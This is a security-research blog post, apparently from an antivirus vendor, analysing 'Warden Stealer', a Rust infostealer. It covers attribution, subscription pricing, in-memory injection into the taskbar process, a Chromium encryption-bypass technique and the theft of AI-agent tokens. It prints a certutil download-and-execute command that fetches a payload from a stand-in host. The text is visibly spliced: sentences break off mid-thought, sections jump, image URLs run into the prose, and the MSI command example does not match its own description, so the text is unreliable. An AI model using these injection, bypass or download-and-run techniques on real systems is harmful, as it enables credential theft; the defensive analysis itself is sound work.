Attribution\u003c/h2\u003e\n\u003cp\u003eWarden Stealer is a rapidly growing and actively developed infostealer-as-a-service, promoted on underground forums since August 2026. The stealer is written in the Rust programming language and targets Windows systems from Windows 8 through Windows 11 (Figure 1 below also lists Windows 7 as supported, but support for it was dropped as of Warden Stealer version 1.9).\u003c/p\u003e\n\u003cp\u003eAccording to its advertisement, Warden Stealer is supposedly capable of stealing data from all Chromium- and Gecko-based browsers, more than 200 cryptocurrency wallet extensions, and over 360 other targets across 13 categories, including messengers, password managers, 2FA tools, and VPN clients, with the ability to further expand its collection scope through custom file and registry grabbing rules. is particularly worth highlighting, however, is that Warden Stealer is one of the first infostealers we have observed stealing configuration files and local data belonging to AI assistants and agentic coding tools, such as Claude, Codex, Grok, and Cursor. This reflects an emerging trend we have been observing across the infostealer landscape recently, and one that comes as no surprise, given how much sensitive information these files may hold. Depending on the agent and its configuration, they may contain access and refresh tokens, credentials stored in MCP configurations, prompt histories, conversation databases, and traces of the projects a developer has been working on, giving an attacker both the means to access an account and the context needed to understand what valuable data is behind it.\u003c/p\u003e\n\u003cp\u003eInterestingly, stealing AI agent data was not among the capabilities originally listed in Warden Stealer’s advertisement, nor was it part of every build’s dynamic configuration, which led us to believe that it was the result of custom collection rules defined by specific operators. This, however, changed with Warden Stealer version 1.9 (announced on September 29, 2026), in which the malware authors officially announced the collection of tokens from AI coding agents (see Figure 2). Either way, whether through custom rules or built-in support, AI agent data is now targeted in a substantial subset of Warden Stealer builds, highlighting the growing trend of such data quickly becoming a target of interest for There, however, we referred to Warden Stealer as CallbackBeaver, since at that time we had not yet been able to attribute it to Warden Stealer and had therefore given it our own name.\u003c/p\u003e\n\u003cp\u003eAttribution is always a tricky task, and this case was no exception, as the stealer does not contain any string artifacts that would directly link it to the Warden Stealer brand. What pointed us in the right direction, however, was our in-depth analysis of the stealer, which we cross-referenced with the technical details of the malware shared on underground forums by the authors themselves, as well as with information from a recent \u003ca href=\"https://g0njxa.medium.com/approaching-stealers-devs-a-brief-interview-with-warden-a978d5ae1147\"\u003einterview with Warden Stealer’s authors\u003c/a\u003e conducted by \u003ca href=\"https://x.com/g0njxa\"\u003eg0njxa\u003c/a\u003e. Putting all of the pieces together, we were ultimately able to conclude that CallbackBeaver is, in fact, Warden Stealer. To give readers a better idea of what our attribution is based on, we outline the key pieces of evidence below.\u003c/p\u003e\n\u003cp\u003eFirst, the stealer is written in Rust, which is rather unusual, as only a handful of infostealers opt for this programming language. This is consistent with the interview, in which the malware authors attribute the choice of Rust to their prior experience with it, as well as to the “very good opportunities for code morphing” it provides. Morphing, in turn, is exactly where, we have to admit, Warden Stealer undoubtedly stands out from what is usual in the MaaS ecosystem. Unsurprisingly, it is also one of the main selling points the authors build their marketing around, advertising Warden Stealer as the “only true morpher on the market (not just an obfuscator), built upon AST code parsing and LLVM IR passes.”\u003c/p\u003e\n\u003cp\u003eBased on our analysis, the individual builds are indeed heavily obfuscated and morphed. Combined with the fact that Rust binaries are notoriously hard to reverse engineer, this makes Warden Stealer genuinely tricky to detect statically, but of course not impossible, as Warden authors kindly started to note in their underground forum posts (see Figures 3 and Although the authors may not necessarily be telling the truth, the timeline once again fits their claims.\u003c/p\u003e\n\u003cp\u003eClosely related to the timeline is the spread of the stealer itself, as Warden Stealer has, in a matter of months, already become one of the most prevalent infostealers in our user base, which, again, is consistent with the authors’ claim that about 110 customers are currently actively using it.\u003c/p\u003e\n\u003cp\u003eBesides its stealing capabilities, Warden Stealer comes with its own loader and a built-in cryptocurrency clipper, which is not that common for MaaS infostealers and might be one of the key factors behind its rapid growth in popularity. Therefore, the very fact that the samples we analyzed were generally distributed via the stealer’s own dedicated loader and came with built-in clipper functionality was another strong indicator.\u003c/p\u003e\n\u003cp\u003eAs for the clipper functionality, Warden Stealer originally supported six cryptocurrency networks (see Figure 5), namely BTC (Bitcoin), ETH (Ethereum), TRX (TRON), XMR (Monero), SOL (Solana), and TON (The Open Network), which exactly matches (notably, even in the same order) the dynamic configuration we extracted from an older Warden Stealer build (see Figure 6). there are several other attribution factors, mainly related to the capabilities claimed by the authors and what the stealer actually does, as well as to the obfuscation techniques it employs, we will not cover them in detail, as we believe the evidence outlined above already speaks for itself.\u003c/p\u003e\n\u003cp\u003eWarden Stealer is offered through a tiered subscription model, with the individual plans differing primarily in operational limits, such as the number of builds and C2 domains. Initially, the malware authors offered the Test plan for $90 per week, and the Personal and Premium plans for $349 and $499 per month, respectively. With version 1.9, however, they raised their prices considerably: the Test plan now costs $149 for three days, while the Personal plan has risen to $450 and the Premium plan to $800 per month. At the same time, they introduced a new Enterprise plan, priced at $1,500 per month.\u003c/p\u003e\n\u003cp\u003eFinally, given that Warden Stealer deliberately avoids systems located in CIS and Baltic countries and is advertised in Russian, it is reasonable to assume that its developers likely operate within Russian-speaking cybercriminal communities. However, this does not necessarily indicate their precise origin.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_08.jpg.webp?itok=wrWjPe6Z having been on the market for only a short period of time, Warden Stealer has already positioned itself as a major player in the infostealer landscape and is currently one of the most prevalent infostealers in our user base (together with \u003ca href=\"https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass\"\u003eVidar\u003c/a\u003e, \u003ca href=\"https://www.gendigital.com/blog/insights/research/wordlistloader-delivering-amatera-via-clearfake-campaigns\"\u003eAmatera\u003c/a\u003e, and \u003ca href=\"https://www.gendigital.com/blog/insights/research/remus-64bit-variant-of-lumma-stealer\"\u003eRemus\u003c/a\u003e).\u003c/p\u003e\n\u003cp\u003eRegarding its distribution, since Warden Stealer is sold as MaaS, the infection vectors ultimately depend on the individual operators. As a result, we are seeing it delivered through all the standard infection vectors, including, among others, supposedly cracked software, game cheats, malvertising, and ClickFix campaigns.\u003c/p\u003e\n\u003cp\u003eGiven its active development, the built-in loader and clipper, the authors’ ongoing efforts to modify their builds to evade detection, and their use of AI (as they claimed in the interview), we expect Warden Stealer to remain a key player in the infostealer market for the foreseeable future.\u003c/p\u003e\n\u003ch2\u003eTechnical Analysis\u003c/h2\u003e\n\u003cp\u003eIn this section, we focus on selected technical aspects of Warden Stealer. Note that this is only a selected subset of its functionality rather than an exhaustive overview.\u003c/p\u003e\n\u003ch3\u003eWarden Loader\u003c/h3\u003e\n\u003cp\u003eWhen it comes to the Malware-as-a-Service (MaaS) infostealer ecosystem, the operational boundaries are usually strictly drawn: the malware authors develop the core payload (the stealer), while operators are left to handle the rest of the infection chain, including defense-evasion layers (crypters and/or loaders) and payload delivery. Against this conventional backdrop, Warden Stealer stands out as a notable exception, as it comes with its own dedicated loader, which takes some of the burden off operators and may thus partly account for the stealer’s rapid rise in popularity.\u003c/p\u003e\n\u003cp\u003eJudging from our code analysis, we assess with high confidence that the loader is not a third-party add-on but a component developed and maintained in-house by the Warden Stealer authors themselves. We base this assessment on the fact that the loader shares the same obfuscation scheme and a non-trivial number of other similarities with the stealer (some of which we highlight throughout the rest of this blog post), firmly linking both components to the same malware authors. That said, the loader layer is not strictly required, as the stealer can also be shipped as a standalone binary. Still, we predominantly observe Warden Stealer being distributed inside this loader.\u003c/p\u003e\n\u003cp\u003eFunctionally, the loader is rather straightforward, operating with one clear goal – to reconstruct the stealer payload in memory and execute it. Overall, Warden Stealer can be deployed in one of three available execution modes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInjection mode:\u003c/strong\u003e the loader is shipped as an EXE that reconstructs the stealer payload (DLL) and injects it into an already-running, legitimate-looking process. This is the most common mode and likely the default configuration.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSideload mode:\u003c/strong\u003e the loader is shipped as a DLL alongside a legitimately signed EXE that sideloads it. Once sideloaded, the loader reconstructs the stealer payload (DLL) and executes it in memory within the host process.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eStandalone mode:\u003c/strong\u003e the stealer is shipped without the loader layer altogether, as a standalone EXE.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSince the vast majority of samples we observe in the wild use the injection mode, we focus solely on this specific mode going forward.\u003c/p\u003e\n\u003cp\u003eThe stealer payload is embedded in the loader’s \u003ccode\u003e.rdata\u003c/code\u003e section and encoded using a custom Base64-like alphabet unique to each build. Interestingly, these alphabets differ across builds not only in character order but also in the character set itself (i.e., they are not mere permutations of a single character set). Nevertheless, each alphabet consists solely of printable ASCII characters and is shared by the loader and the stealer build it carries, both of which use it to decode their obfuscated blobs, including obfuscated strings.\u003c/p\u003e\n\u003cp\u003eExamples of Base64-like alphabets observed across different Warden Stealer builds:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;y.#'0_Oe;5~q4I[a9Tf3:8pvR{F$ZQg)!(-XtCYznuPU?Jiw\u0026amp;BK@6}*|1D,2\u0026gt;7A\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eWJOTHk*aGS.#bdwLArzDM69yUR(NXZj\u0026lt;8?n{F!'e$C3~,|1B;)c04p]xQs_:o%\u0026amp;q\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eDa7L(\u0026gt;CZ4tB2bkT|u}%jRl5O^n]cIvoM-q;W)w\u0026lt;.\u0026amp;rdVP*gHzp_@Nh$1eYU'[~GK\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_10.jpg.webp?itok=Gu9sT_rl 420px)","type":"image/webp","width":690,"height":256}],"caption":"Figure 10: The initial bytes of a Warden Stealer payload blob encoded using a custom Base64-like alphabet.","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_10.jpg.webp?itok=wsY-b-xT","link":""}]},{"bundle":"markdown","content":"\u003cp\u003eThe deobfuscation process itself consists of two steps. Each encoded blob, whether an obfuscated string or the stealer payload, is first decoded using the custom Base64-like scheme. The loader maps each character to its index in the 64-character alphabet, subtracts a blob-specific shift modulo 64, and combines the resulting 6-bit values into bytes as in ordinary Base64. The decoded stream is then decompressed using a custom LZSS-style format.\u003c/p\u003e\n\u003cp\u003eRegarding the payload reconstruction, the loader processes three separately decoded blobs: the main blob containing the PE section data, an auxiliary blob providing the PE header template, and a bootstrap stub template. The first two blobs are combined to reconstruct the stealer’s PE image in memory, while the bootstrap stub template is filled with runtime values and appended after the rebuilt image and a runtime-built context block.\u003c/p\u003e\n\u003cp\u003eNext, the loader selects the target process for injection. The latest builds do so by locating the \u003ccode\u003eShell_TrayWnd\u003c/code\u003e window (the Windows taskbar) using \u003ccode\u003eFindWindowA\u003c/code\u003e and retrieving the PID of its owning process via \u003ccode\u003eGetWindowThreadProcessId\u003c/code\u003e. In a standard Windows session, this window typically belongs to \u003ccode\u003eexplorer.exe\u003c/code\u003e, although the loader does not verify the process name. Older builds also targeted other processes, such as \u003ccode\u003emsiexec.exe\u003c/code\u003e or \u003ccode\u003edllhost.exe\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eAfter obtaining a handle to the target process, the loader allocates executable memory within it using \u003ccode\u003eVirtualAllocEx\u003c/code\u003e with the \u003ccode\u003ePAGE_EXECUTE_READWRITE\u003c/code\u003e protection flag. Once the remote base address is known, it applies the necessary relocations and injects the reconstructed image, context block, and bootstrap stub into the allocated region as a single contiguous buffer via \u003ccode\u003eWriteProcessMemory\u003c/code\u003e. Subsequently, the loader invokes \u003ccode\u003eCreateRemoteThread\u003c/code\u003e to start execution at the appended bootstrap stub.\u003c/p\u003e\n\u003cp\u003eSince the payload is manually mapped, the standard Windows loader does not register it as a loaded module. To fill this gap, the bootstrap stub first retrieves the PEB via \u003ccode\u003eRtlGetCurrentPeb\u003c/code\u003e and links two \u003ccode\u003eLIST_ENTRY\u003c/code\u003e nodes from the context block into \u003ccode\u003ePEB-\u0026gt;Ldr-\u0026gt;InLoadOrderModuleList\u003c/code\u003e and \u003ccode\u003ePEB-\u0026gt;Ldr-\u0026gt;InMemoryOrderModuleList\u003c/code\u003e, making the payload visible to code that enumerates these lists. Finally, the bootstrap stub invokes non-null function pointers from a fixed range in the payload image, including its TLS callbacks, and transfers control to the payload by calling its PE entry point.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_11.jpg.webp?itok=pUFAhmWd is also worth noting that the Warden Stealer loader binaries are often deliberately inflated with a massive PE overlay, a design choice intended to bypass detection (also employed, for example, by \u003ca href=\"https://www.gendigital.com/blog/insights/research/goflateloader-delivers-multiple-infostealers\"\u003eGoFlateLoader\u003c/a\u003e), as excessively large executables may pose challenges for some AV and EDR solutions, which, primarily due to performance and resource constraints, often enforce practical file-size limits for deep scanning and/or emulation.\u003c/p\u003e\n\u003cp\u003eThe same logic extends to automated analysis pipelines, where bloated files frequently cause timeouts during heuristic analysis and may even prevent the sample from being uploaded to cloud-based sandboxes or threat intelligence platforms, which enforce their own strict upload limits to manage bandwidth and storage costs.\u003c/p\u003e\n\u003ch3\u003eObfuscation\u003c/h3\u003e\n\u003cp\u003eWhen it comes to static analysis, Warden Stealer builds are protected with several layers of obfuscation. However, since the obfuscation is subject to frequent changes, both to evade detection and to break automated analysis tooling, we do not aim to provide an exhaustive technical breakdown, but rather to give readers a general overview of the techniques used. Note that all techniques covered below apply to both the loader and the stealer.\u003c/p\u003e\n\u003cp\u003eFirst, as already mentioned in the loader section, Warden Stealer obfuscates its strings using a custom LZSS-style compression combined with a build-specific Base64-like alphabet and a string-specific shift parameter, with each string being decoded lazily upon its first use and then cached for any subsequent references.\u003c/p\u003e\n\u003cp\u003eSecond, Windows API functions are resolved dynamically by name (using a combination of \u003ccode\u003eLoadLibraryA\u003c/code\u003e and \u003ccode\u003eGetProcAddress\u003c/code\u003e) and cached after the first lookup, with both the module and function names stored as obfuscated strings and decoded on demand.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_12.jpg.webp?itok=gIWN-gNT Encryption Bypass\u003c/h3\u003e\n\u003cp\u003eA key part of Warden Stealer’s functionality is the theft of sensitive browser data, such as cookies and passwords, from Chromium-based browsers. Nowadays, however, such data is protected by \u003ca href=\"https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html\"\u003eApplication-Bound Encryption (ABE)\u003c/a\u003e. To bypass ABE, the stealer employs an approach that we have not previously observed in this exact form but that closely resembles a combination of the bypasses used by the latest versions of Vidar and Remus. Nevertheless, its implementation differs in several aspects, suggesting independent development rather than a direct copy.\u003c/p\u003e\n\u003cp\u003eSince we have already covered the bypasses of \u003ca href=\"https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass\"\u003eVidar\u003c/a\u003e and \u003ca href=\"https://www.gendigital.com/blog/insights/research/remus-64bit-variant-of-lumma-stealer\"\u003eRemus\u003c/a\u003e, as well as \u003ca href=\"https://www.gendigital.com/blog/insights/research/voidstealer-abe-bypass\"\u003ethe inner workings of ABE\u003c/a\u003e, in our earlier posts, we do not revisit them here and instead outline the main ideas behind Warden Stealer’s own implementation. For readers interested in the broader background, we encourage checking those earlier posts.\u003c/p\u003e\n\u003cp\u003eFrom a high-level perspective, Warden Stealer’s approach to bypassing ABE boils down to three steps:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLocate a candidate \u003ccode\u003ev20_master_key\u003c/code\u003e in its \u003cstrong\u003eencrypted form\u003c/strong\u003e within the browser’s memory\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eExecute injected shellcode inside the browser process to decrypt the key\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRead the decrypted key back\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBefore any decryption can take place, however, Warden Stealer first needs to locate the \u003ccode\u003ev20_master_key\u003c/code\u003e in its encrypted form. Here, its approach closely resembles that of Vidar, as it also scans the browser’s memory for a layout consistent with entries in Chromium’s \u003ccode\u003eos_crypt_async::Encryptor::KeyRing\u003c/code\u003e, a map that holds the keys used by the \u003ccode\u003eEncryptor\u003c/code\u003e class, including the encrypted \u003ccode\u003ev20_master_key\u003c/code\u003e. That said, its scanning pattern is considerably simpler. Whereas Vidar matches a 32-byte signature that also covers fixed values of specific fields within a \u003ccode\u003eKeyRing\u003c/code\u003e entry, Warden Stealer searches the browser’s memory solely for the four-byte sequence \u003ccode\u003ev20\\x00\u003c/code\u003e – the null-terminated \u003ccode\u003ev20\u003c/code\u003e tag under which the \u003ccode\u003ev20_master_key\u003c/code\u003e is stored in the \u003ccode\u003eKeyRing\u003c/code\u003e map.\u003c/p\u003e\n\u003cp\u003eNaturally, such a short pattern yields more candidates, so Warden Stealer narrows them down by checking whether the values at specific offsets from each match are consistent with the expected layout of a \u003ccode\u003eKeyRing\u003c/code\u003e entry. Now, this part is admittedly a bit tricky, as it relies on several assumptions we made about the internal memory layout, as well as on implementation-specific representations of various C++ standard library types (\u003ccode\u003estd::map\u003c/code\u003e, \u003ccode\u003estd::string\u003c/code\u003e, \u003ccode\u003estd::vector\u003c/code\u003e, and \u003ccode\u003estd::optional\u003c/code\u003e). Therefore, please treat the following interpretation as a high-confidence assessment rather than a certainty. That said, judging from our analysis, we strongly believe that these checks follow from the memory layout of a \u003ccode\u003eKeyRing\u003c/code\u003e entry.\u003c/p\u003e\n\u003cp\u003eChromium \u003ca href=\"https://github.com/chromium/chromium/blob/2e22ca200ff2c2c2606e345b0ec880339b6bfa73/components/os_crypt/async/common/encryptor.h#L121\"\u003edefines\u003c/a\u003e \u003ccode\u003eKeyRing\u003c/code\u003e as \u003ccode\u003estd::map\u0026lt;/*tag=*/std::string, std::optional\u0026lt;Key\u0026gt;\u0026gt;\u003c/code\u003e, so each of its entries is a \u003ccode\u003estd::pair\u0026lt;const std::string, std::optional\u0026lt;Key\u0026gt;\u0026gt;\u003c/code\u003e stored in a node of the red-black tree that implements the map. Within this pair, the \u003ccode\u003estd::string\u003c/code\u003e tag is followed by the \u003ccode\u003estd::optional\u0026lt;Key\u0026gt;\u003c/code\u003e value, whose \u003ccode\u003eKey\u003c/code\u003e object holds the encrypted \u003ccode\u003ev20_master_key\u003c/code\u003e in its \u003ccode\u003ekey_\u003c/code\u003e member variable (a \u003ccode\u003estd::vector\u0026lt;uint8_t\u0026gt;\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eSpecifically, Warden Stealer inspects three consecutive \u003ccode\u003eqwords\u003c/code\u003e at offsets \u003ccode\u003e+32\u003c/code\u003e, \u003ccode\u003e+40\u003c/code\u003e, and \u003ccode\u003e+48\u003c/code\u003e from each \u003ccode\u003ev20\\x00\u003c/code\u003e match, which, under libc++’s default pointer-based representation of \u003ccode\u003estd::vector\u003c/code\u003e, should correspond to the \u003ccode\u003ebegin\u003c/code\u003e, \u003ccode\u003eend\u003c/code\u003e, and \u003ccode\u003ecapacity_end\u003c/code\u003e pointers of the \u003ccode\u003ekey_\u003c/code\u003e vector, as illustrated in Figure 21 (and previously dissected in greater detail in \u003ca href=\"https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass\"\u003eour analysis of Vidar’s ABE bypass\u003c/a\u003e). This leads us to conclude that the stealer leverages the \u003ccode\u003ekey_\u003c/code\u003e vector as a verification mechanism: only if the data at these offsets plausibly resembles a \u003ccode\u003estd::vector\u003c/code\u003e structure does the stealer treat the match as a candidate \u003ccode\u003eKeyRing\u003c/code\u003e node. In practice, the verification is rather heuristic and boils down to the following sanity checks of the three pointers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u003ccode\u003ebegin\u003c/code\u003e pointer must be 8-byte aligned and lie within the user-mode address range (\u003ccode\u003e0x10000–0x7FFFFFFFFFFF\u003c/code\u003e)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u003ccode\u003eend\u003c/code\u003e pointer must equal \u003ccode\u003ebegin + 32\u003c/code\u003e, indicating a 32-byte buffer (i.e., the size of the \u003ccode\u003ev20_master_key\u003c/code\u003e)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u003ccode\u003ecapacity-end\u003c/code\u003e pointer must also be 8-byte aligned, lie within the user-mode address range, and fall between \u003ccode\u003eend\u003c/code\u003e and \u003ccode\u003ebegin + 64\u003c/code\u003e, limiting the vector’s capacity to between 32 and 64 bytes\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_21.jpg.webp?itok=e_5HjukU \u003ccode\u003ev20_master_key\u003c/code\u003e) are then sorted, deduplicated, and tested one by one. For each candidate, Warden Stealer reads the 32 bytes it points to and stages them in the target browser process alongside a short shellcode stub. To run the stub, it hijacks one of the browser’s existing threads by suspending it, saving its original context, and redirecting its instruction pointer to the shellcode. Once resumed, the shellcode stub invokes \u003ccode\u003eCryptUnprotectMemory\u003c/code\u003e on the staged buffer with the \u003ccode\u003eCRYPTPROTECTMEMORY_SAME_PROCESS\u003c/code\u003e flag (similar to Remus, which likewise injects a small shellcode into the browser to perform exactly this call). Because the decryption happens in place, Warden Stealer simply polls the buffer and compares it against the original encrypted bytes. In response, the server returns the stealer’s dynamic configuration, which is XOR-obfuscated with the same build-specific byte as the outgoing records but, unlike them, is not LZNT1-compressed. If the exchange fails or the response contains no valid configuration, Warden Stealer falls back to the next C2 domain in the list. Once a valid configuration is obtained, Warden Stealer collects data according to the configured feature flags and collection rules and uploads the stolen data to the C2 server in batches.\u003c/p\u003e\n\u003cp\u003eAn example of Warden Stealer’s dynamic configuration is available on our \u003ca href=\"https://github.com/gendigitalinc/ioc/blob/master/WardenStealer/extras/warden_stealer_configuration.bin\"\u003eGitHub\u003c/a\u003e.\u003c/p\u003e\n\u003ch3\u003eExecution of Additional Payloads\u003c/h3\u003e\n\u003cp\u003eIn addition to its stealing capabilities, Warden Stealer can download and execute additional payloads from URLs supplied in its dynamic configuration. For each URL, it constructs a destination path under \u003ccode\u003e%TEMP%\u003c/code\u003e and downloads the file there using the \u003ccode\u003ecertutil.exe -urlcache -split -f \"\u0026lt;URL\u0026gt;\" \"\u0026lt;destination\u0026gt;\"\u003c/code\u003e command. The destination filename is derived from the \u003ccode\u003eGetTickCount\u003c/code\u003e value, formatted as eight zero-padded lowercase hexadecimal digits, followed directly by the URL’s zero-based position in the configuration list. The extension is selected by checking the URL text preceding any query string or fragment for \u003ccode\u003e.msi\u003c/code\u003e, \u003ccode\u003e.bat\u003c/code\u003e, or \u003ccode\u003e.cmd\u003c/code\u003e, with \u003ccode\u003e.exe\u003c/code\u003e used otherwise. Based on the selected extension, the payload is launched in one of the following ways:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMSI:\u003c/strong\u003e \u003ccode\u003emsiexec.exe /i \"\u0026lt;destination\u0026gt;\" /qn /norestart\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBAT/CMD:\u003c/strong\u003e \u003ccode\u003ecmd.exe /c \"\u0026lt;destination\u0026gt;\"\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eEXE (default):\u003c/strong\u003e the downloaded file is executed directly\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTo carry out both the download and the execution steps, Warden Stealer leverages the \u003ccode\u003eShell.Application\u003c/code\u003e COM object (rather than calling \u003ccode\u003eCreateProcess\u003c/code\u003e directly). Through its \u003ccode\u003eIShellDispatch2\u003c/code\u003e interface, it invokes the \u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/shell/ishelldispatch2-shellexecute\"\u003eShellExecute\u003c/a\u003e method to launch \u003ccode\u003ecmd.exe\u003c/code\u003e with a hidden window (\u003ccode\u003eSW_HIDE\u003c/code\u003e). The arguments passed to \u003ccode\u003ecmd.exe\u003c/code\u003e combine the \u003ccode\u003ecertutil\u003c/code\u003e download command with the appropriate payload invocation, chained with \u003ccode\u003e\u0026amp;\u0026amp;\u003c/code\u003e, so the payload is launched only if the download succeeds (or more precisely, if \u003ccode\u003ecertutil\u003c/code\u003e returns a successful exit code).\u003c/p\u003e\n\u003cp\u003eThe following examples illustrate the resulting command lines, assuming \u003ccode\u003e%TEMP%\u003c/code\u003e is \u003ccode\u003eC:\\Users\\user\\AppData\\Local\\Temp\u003c/code\u003e, \u003ccode\u003eGetTickCount\u003c/code\u003e returns \u003ccode\u003e0x1337\u003c/code\u003e for each item, and the URLs appear in the configuration in MSI, BAT, and EXE order:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMSI:\u003c/strong\u003e \u003ccode\u003ecmd.exe /c certutil.exe -urlcache -split -f \"https://example.com/payload.msi\" \"C:\\Users\\user\\AppData\\Local\\Temp\\000013370.msi\" \u0026amp;\u0026amp; \"C:\\Users\\user\\AppData\\Local\\Temp\\000013372.exe\"\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eSummary\u003c/h2\u003e\n\u003cp\u003eWarden Stealer has rapidly emerged as one of the most prevalent infostealers we protect our users from, ranking on par with Amatera, Remus and Vidar. Written in Rust, it combines broad data-stealing capabilities with a dedicated custom loader and a built-in cryptocurrency clipper. It is actively developed and has been promoted on underground forums since August 2026, although we have been tracking its first builds since early May 2026.\u003c/p\u003e\n\u003cp\u003eIn this blog post, we showed how our investigation linked the malware we previously tracked as CallbackBeaver to Warden Stealer. This attribution draws on similarities between the analyzed samples and the authors’ public statements in underground forum posts and an interview, including details about the development timeline and loader and clipper capabilities.\u003c/p\u003e\n\u003cp\u003eWe also described a variety of the stealer’s obfuscation techniques and anti-VM checks, as well as its approach to bypassing Application-Bound Encryption to steal sensitive information from Chromium-based browsers. Notably, Warden Stealer is one of the first stealers actively targeting locally installed AI agents to exfiltrate access and refresh tokens, prompt histories, credentials stored in MCP configurations, and other sensitive developer-related information, highlighting the shift we have recently observed in the infostealer landscape.\u003c/p\u003e\n\u003ch2\u003eIndicators of Compromise (IoCs)\u003c/h2\u003e\n\u003cp\u003eA complete, much more extensive, IoC list is available on our \u003ca
